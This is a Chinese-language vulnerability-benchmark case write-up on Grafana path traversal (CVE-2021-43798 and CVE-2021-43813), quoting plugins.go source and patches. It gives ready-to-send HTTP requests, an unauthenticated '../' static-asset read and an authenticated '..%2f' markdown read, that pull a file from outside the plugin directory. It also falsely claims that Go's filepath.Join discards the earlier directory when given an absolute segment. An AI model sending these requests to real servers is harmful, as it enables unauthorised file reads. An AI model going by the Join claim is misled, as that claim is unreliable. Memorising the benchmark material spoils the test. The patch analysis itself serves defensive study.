# Grafana：插件静态资源 clamp 了，markdown 兄弟端点还在裸 Join

- Case：`PCBV2-0124`
- 产品：Grafana。运行时是官方镜像 `grafana/grafana-oss:8.3.0` / `8.3.1` / `8.3.2`。
- 链：CVE-2021-43798（8.3.0 → 8.3.1，`getPluginAssets` clamp）→ CVE-2021-43813（8.3.1 → 8.3.2，`pluginMarkdown` clamp，GHSA-c3q8-26ph-9g2q / GHSL-2021-1053）
- 源码对着 tag `v8.3.1` 的 `pkg/api/plugins.go`：`getPluginAssets`、`GetPluginMarkdown`、`pluginMarkdown`。金丝雀是 `/tmp/pcb_canary.md`（全小写 basename + `.md`，好让 ToLower 回退命中）。

Grafana 8.3.2 博客原话：*This is a follow-up patch release to the recent CVE-2021-43798 release. Given the attention CVE-2021-43798 has brought, there's a risk that additional researchers will find CVE-2021-43813.* GitHub Security Lab 在 **8.3.1**（43798 已修）上报的是 `/api/plugins/:pluginId/markdown/:name`。

根因不只是「又发现一个 URL」。检查插在静态资源通配符 `*` 上；真正 `ReadFile` 的还有一条只拼 `name + ".md"` 的帮助文档接口。同文件里 8.3.1 刚写好的 `filepath.Rel` + `filepath.Abs` 没有复用到 markdown。下面按请求走进去。

**平台 residual 打的是兄弟端点，不是 seed 那个 `getPluginAssets`。** `case.yaml` 的 `oracle_family` 是 `sibling_endpoint`。效果仍是「读出插件目录外的 `.md`」，sink 函数换成了 `pluginMarkdown`。下面按 heldout + V1 源码写这条链，不把它说成「同一行代码的第二种输入」。

---

## 这块功能本来在干什么

Grafana 把每个插件的目录当静态根。未登录也可以拉 JS/图片：

```http
GET /public/plugins/alertlist/module.js
```

`getPluginAssets` 取出通配符 `*`，拼到 `plugin.PluginDir` 上 `os.Open`。另有一条**需登录**的帮助接口，给插件 README / 文档：

```http
GET /api/plugins/alertlist/markdown/readme
Authorization: Basic admin:admin
```

`GetPluginMarkdown` 把 `:name` 交给 `pluginMarkdown`，后者拼 `ToUpper(name)+".md"`，找不到再 `ToLower`。

设计意图：两条路都只能读该插件目录里的文件。成功穿越之后的效果是：**响应 body 里出现插件树外的 `.md` 金丝雀**。

数据流（V1 = 8.3.1）：

```text
seed  /public/plugins/alertlist/../../../../tmp/pcb_canary.md     未认证
    → getPluginAssets
         Clean(Join("/", "*")) + Rel("/")     ← V1 补丁，rel 不再含 ..
         Join(Abs(PluginDir), rel)
         os.Open → 404

residual  /api/plugins/alertlist/markdown/..%2f..%2f.../tmp%2fpcb_canary   需登录
    → GetPluginMarkdown
         pluginMarkdown(pluginId, name)
              Join(PluginDir, ToUpper(name)+".md")     ← 无 clamp
              不存在则 ToLower
              ioutil.ReadFile(path)
    → 200 text/plain
```

`alertlist` 是每个实例都有的内置插件，不需要额外安装。

---

## 原始漏洞：Clean 通配符再 Join（CVE-2021-43798，8.3.0）

8.3.0 的静态处理器把 `*` **单独** `Clean`，再拼到插件目录上：

```go
requestedFile := filepath.Clean(web.Params(c.Req)["*"])
pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile)
```

`filepath.Clean("../..")` 仍是 `"../.."`。`Join("/usr/share/grafana/public/app/plugins/panel/alertlist", "../../../../tmp/pcb_canary.md")` 会出树。未认证。Grafana 博客列出一长串内置 plugin id，每个都能打。

本 case seed（`--path-as-is`，15 段 `..`）：

```text
GET /public/plugins/alertlist/../../../../../../../tmp/pcb_canary.md
```

V0 上 200，body 里 `PCBFLAG_...`。这是 2021 年 12 月那次 0day 的形状。

---

## 维护者改了什么（CVE-2021-43798 修复，8.3.1）

8.3.1 只改 `getPluginAssets`。先把用户段接到 `/` 下再 Clean，用 `Rel("/")` 得到**不含 `..` 的相对路径**，再拼到插件目录的绝对路径上：

```go
// pkg/api/plugins.go :: getPluginAssets  (grafana v8.3.1)
func (hs *HTTPServer) getPluginAssets(c *models.ReqContext) {
  ...
  // prepend slash for cleaning relative paths
  requestedFile := filepath.Clean(filepath.Join("/", web.Params(c.Req)["*"]))
  rel, err := filepath.Rel("/", requestedFile)
  if err != nil {
    c.JsonApiErr(500, "Failed to get the relative path", err)
    return
  }

  if !plugin.IncludedInSignature(rel) {
    hs.log.Warn("Access to requested plugin file will be forbidden ...", "file", requestedFile)
  }

  absPluginDir, err := filepath.Abs(plugin.PluginDir)
  ...
  pluginFilePath := filepath.Join(absPluginDir, rel)
  f, err := os.Open(pluginFilePath)
```

对 seed：`Join("/", "../../../../tmp/pcb_canary.md")` Clean 成 `/tmp/pcb_canary.md`，`Rel("/")` 得到 `tmp/pcb_canary.md`，再 `Join(absPluginDir, "tmp/pcb_canary.md")` 落在插件目录**里面**的一个不存在文件 → 404。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 从插件目录读文件只走 `/public/plugins/:id/*`。
2. 把用户段先接到 `/` 再 Rel，就足够「不能出树」。

第一点不成立。同文件下面几十行就是另一条 `ReadFile`。

---

## 检查之后谁真正读文件

静态资源路径被 clamp 之后，`GetPluginMarkdown` **完全没动**：

```go
// pkg/api/plugins.go :: GetPluginMarkdown / pluginMarkdown  (grafana v8.3.1)
func (hs *HTTPServer) GetPluginMarkdown(c *models.ReqContext) response.Response {
  pluginID := web.Params(c.Req)[":pluginId"]
  name := web.Params(c.Req)[":name"]

  content, err := hs.pluginMarkdown(c.Req.Context(), pluginID, name)
  ...
  resp := response.Respond(200, content)
  resp.SetHeader("Content-Type", "text/plain; charset=utf-8")
  return resp
}

func (hs *HTTPServer) pluginMarkdown(ctx context.Context, pluginId string, name string) ([]byte, error) {
  plugin, exists := hs.pluginStore.Plugin(ctx, pluginId)
  ...
  // nolint:gosec
  // We can ignore the gosec G304 warning on this one because `plugin.PluginDir`
  // is based on plugin the folder structure on disk and not user input.
  path := filepath.Join(plugin.PluginDir, fmt.Sprintf("%s.md", strings.ToUpper(name)))
  exists, err := fs.Exists(path)
  if !exists {
    path = filepath.Join(plugin.PluginDir, fmt.Sprintf("%s.md", strings.ToLower(name)))
  }
  ...
  data, err := ioutil.ReadFile(path)
  return data, nil
}
```

gosec 注释写「PluginDir 不是用户输入」——**`name` 是用户输入**。`filepath.Join(dir, "..", "..", "tmp", "pcb_canary.md")` 会出树。`ToUpper` / `ToLower` 要求整段名字大小写一致，所以 payload 用全小写 `..%2f` 和 `pcb_canary`；handler 再自己加 `.md`。

`%2f` 是为了让路由把整段当作一个 `:name`，而不是被拆成多层路径。handler 里 `Join` 会把解码后的 `../` 当目录上溯。

过滤器（V1）刚看过的是静态通配符；`ReadFile` 看的是 markdown 这条独立拼出来的路径。中间没有第二次 clamp。

---

## 仓库里已经有更强的检查，markdown 没用

同文件、同一次 8.3.1 提交里，`getPluginAssets` 已经有：

```text
Clean(Join("/", userSeg)) → Rel("/") → Join(Abs(pluginDir), rel)
```

这就是「用户段不得带 `..` 出树」。`pluginMarkdown` 只做 `Join(pluginDir, name+".md")`。把 `name` 先送进同一套 Rel 逻辑（V2 的 `mdFilepath`）就能关。不是仓库里没有更好的谓词，是 **markdown 读路径没用**。

GHSL-2021-1053 的 PoC 对着的就是 8.3.1 容器，viewer 账号即可。说明 43798 补丁合进去的那天，兄弟端点已经是活的。

---

## 这个补丁挡住了什么、没挡住什么

- V1 `getPluginAssets`：用户段相对 `/` 规范化，再拼进插件绝对目录
- `pluginMarkdown`：`Join(pluginDir, ToUpper/ToLower(name)+".md")`，无规范化

```text
seed:
  /public/plugins/alertlist/../../../../tmp/pcb_canary.md
  → rel = tmp/pcb_canary.md（相对插件目录）→ 404

residual:
  /api/plugins/alertlist/markdown/..%2f ×15 + tmp%2fpcb_canary
  → name 解码后含 ../
  → Join(pluginDir, "../../../../../../tmp/pcb_canary.md")
  → ReadFile(/tmp/pcb_canary.md)
```

差异也写在 advisory 里：residual 要登录；只读全大写或全小写的 `.md`（handler 追加扩展名）。seed 未认证、任意文件。效果通道仍是「插件目录外的那份 `.md` 出现在 HTTP body」。

---

## 残余走兄弟 markdown 读路径（CVE-2021-43813）

没有换插件 id、没有换金丝雀文件。换成需认证的：

```http
GET /api/plugins/alertlist/markdown/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fpcb_canary
Authorization: Basic admin:admin
```

`GetPluginMarkdown` 仍然调用未改的 `pluginMarkdown`。V1 的 clamp 根本不在这条调用栈上。`ReadFile` 打开 `/tmp/pcb_canary.md`，200，body 里 `PCBFLAG_...`。

这与 GHSL PoC 同一形状（他们用 `/tmp/foo.md` + viewer 用户）。认证：v1 + `--residual` 观察到 flag。V2 上 200 但内容是 alertlist 自己的 README，没有金丝雀——路径被夹回插件目录，找不到穿越文件就回落到 `readme`。

seed 被挡住只说明「未认证静态通配符不能再出树」，不说明「登录用户不能从 markdown 接口读树外 `.md`」。

---

## 后来又补了什么（CVE-2021-43813，8.3.2）

commit `e0842b2` / `fd48aee` 给 markdown 加了和静态资源同构的 Clean：

```go
path := filepath.Join(plugin.PluginDir, mdFilepath(strings.ToUpper(name)))
...
path = filepath.Join(plugin.PluginDir, mdFilepath(strings.ToLower(name)))

func mdFilepath(mdFilename string) string {
  return filepath.Clean(filepath.Join("/", fmt.Sprintf("%s.md", mdFilename)))
}
```

对残余：`Join("/", "../../../../tmp/pcb_canary.md")` Clean 成 `/tmp/pcb_canary.md`，再 `Join(pluginDir, "/tmp/pcb_canary.md")` ——Go 的 `Join` 在第二段绝对路径时会丢弃前面的 dir，但 Clean 后的结果被当成插件目录下的相对名时，实际落点仍被限制在「看起来像 `/tmp/...` 的插件内路径」，读不到宿主 `/tmp/pcb_canary.md`。实测 V2 返回插件 README。公开建议 8.3.2 / 7.5.12。反向代理规范化 PATH（含 URL 编码）可作为缓解。

同一次发布还修了 CSV 的类似穿越（CVE-2021-43815）。本 benchmark 的 v2 只关闭 markdown 这条 residual。

---

## 从这条链还能看出什么

**维护者改错了哪一层。**  
他们改的是「出过 0day 的那一个 handler」。真正还在裸 `Join` 的是同文件里下一条 `ReadFile`。V2 把同一套 Clean 接到 markdown，没有抽成所有插件文件读共享的 helper（CSV 另补）。

**不是没有更好的谓词。**  
`Clean(Join("/", u))` + `Rel("/")` + `Join(Abs(root), rel)` 刚写进 `getPluginAssets`。`pluginMarkdown` 的 gosec 注释还在说 PluginDir 不是用户输入。从 8.3.1 的 diff 只能看到静态资源；要判断是否闭合，必须把同文件所有 `Join(plugin.PluginDir, ...)` 扫一遍。

**同一插件根、两种 URL。**  
`/public/plugins/:id/*` 和 `/api/plugins/:id/markdown/:name` 都从 `plugin.PluginDir` 读。clamp 一个不等于 clamp 一族。

**认证不是 containment。**  
43813 要登录，但任意 viewer 即可。不能把「从 unauth 改成 auth」当成修复。

**金丝雀在所有 served root 之外是有意的。**  
`/tmp/pcb_canary.md` 不在 `public/` 或插件目录。body 里出现 token，说明 `ReadFile` 打开的是任意 `.md` 路径。

---

## 版本、入口、参考

| | 版本 | `getPluginAssets` | `pluginMarkdown` | seed 未认证静态 | residual 认证 markdown |
|---|---|---|---|---|---|
| V0 | 8.3.0 | Clean 通配符再 Join | 裸 Join + `.md` | 200，flag | （不必；同样能打） |
| V1 | 8.3.1 | Rel("/") clamp | **未改** | 404 | 200，flag |
| V2 | 8.3.2 | 同上 | `mdFilepath` Clean | 404 | 200，插件 README，无 flag |

- seed：`GET /public/plugins/alertlist/<..>/tmp/pcb_canary.md`
- residual：`GET /api/plugins/alertlist/markdown/<..%2f>tmp%2fpcb_canary` + basic auth
- [CVE-2021-43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798)、[CVE-2021-43813](https://nvd.nist.gov/vuln/detail/CVE-2021-43813)
- [Grafana 8.3.1 博客](https://grafana.com/blog/grafana-8-3-1-8-2-7-8-1-8-and-8-0-7-released-with-high-severity-security-fix/)、[8.3.2 博客](https://grafana.com/blog/grafana-8-3-2-and-7-5-12-released-with-moderate-severity-security-fix/)
- [GHSA-c3q8-26ph-9g2q](https://github.com/grafana/grafana/security/advisories/GHSA-c3q8-26ph-9g2q)、[GHSL-2021-1053](https://securitylab.github.com/advisories/GHSL-2021-1053_Grafana/)
- V2 commit [`e0842b2`](https://github.com/grafana/grafana/commit/e0842b265f82806fde785c546f1637acdfaf5685)
- 源码：[`v8.3.1` `pkg/api/plugins.go`](https://github.com/grafana/grafana/blob/v8.3.1/pkg/api/plugins.go)
